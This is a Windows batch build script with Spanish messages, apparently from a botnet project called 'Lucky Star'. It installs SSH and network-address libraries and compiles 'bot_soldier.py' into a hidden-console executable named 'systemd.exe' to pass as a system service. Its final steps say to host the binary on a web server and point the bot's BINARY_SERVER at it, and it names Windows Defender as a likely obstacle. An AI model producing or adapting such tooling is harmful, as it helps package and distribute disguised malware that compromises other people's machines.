@echo off
cls
echo.
echo ========================================
echo   COMPILACION LUCKY STAR - PASO A PASO
echo ========================================
echo.

echo [PASO 1] Cerrando procesos que puedan bloquear archivos...
taskkill /F /IM systemd.exe 2>nul
taskkill /F /IM python.exe 2>nul
echo [+] Procesos cerrados
timeout /t 2 /nobreak >nul

echo.
echo [PASO 2] Limpiando builds anteriores...
if exist build rmdir /S /Q build 2>nul
if exist dist rmdir /S /Q dist 2>nul
if exist __pycache__ rmdir /S /Q __pycache__ 2>nul
del /F /Q *.spec 2>nul
echo [+] Limpieza completa
timeout /t 1 /nobreak >nul

echo.
echo [PASO 3] Verificando Python y dependencias...
python --version
if %ERRORLEVEL% NEQ 0 (
    echo [!] Python no encontrado
    pause
    exit /b 1
)

echo [+] Instalando/verificando PyInstaller...
python -m pip install --quiet --upgrade pyinstaller paramiko netaddr cryptography
echo [+] Dependencias listas

echo.
echo [PASO 4] Compilando bot a ejecutable...
echo [*] Esto tomara 2-3 minutos...
echo [*] NO cierres esta ventana
echo.

python -m PyInstaller ^
    --onefile ^
    --noconsole ^
    --name systemd ^
    --clean ^
    --strip ^
    --hidden-import=paramiko ^
    --hidden-import=netaddr ^
    --hidden-import=cryptography ^
    --hidden-import=_cffi_backend ^
    bot_soldier.py

if %ERRORLEVEL% EQU 0 (
    echo.
    echo ========================================
    echo   COMPILACION EXITOSA!
    echo ========================================
    echo.
    if exist dist\systemd.exe (
        echo [+] Ejecutable creado: dist\systemd.exe
        for %%I in (dist\systemd.exe) do echo [+] Tamano: %%~zI bytes ^(~25MB^)
        echo.
        echo [*] Proximo paso:
        echo     1. Prueba local: dist\systemd.exe
        echo     2. Sube a servidor web
        echo     3. Actualiza BINARY_SERVER en bot_soldier.py
        echo.
    ) else (
        echo [!] ERROR: No se encontro dist\systemd.exe
        echo [!] Revisa los mensajes de error arriba
    )
) else (
    echo.
    echo ========================================
    echo   ERROR EN COMPILACION
    echo ========================================
    echo.
    echo [!] Revisa los errores arriba
    echo [!] Problemas comunes:
    echo     - Windows Defender bloqueando
    echo     - Falta de memoria
    echo     - Dependencias faltantes
)

echo.
pause
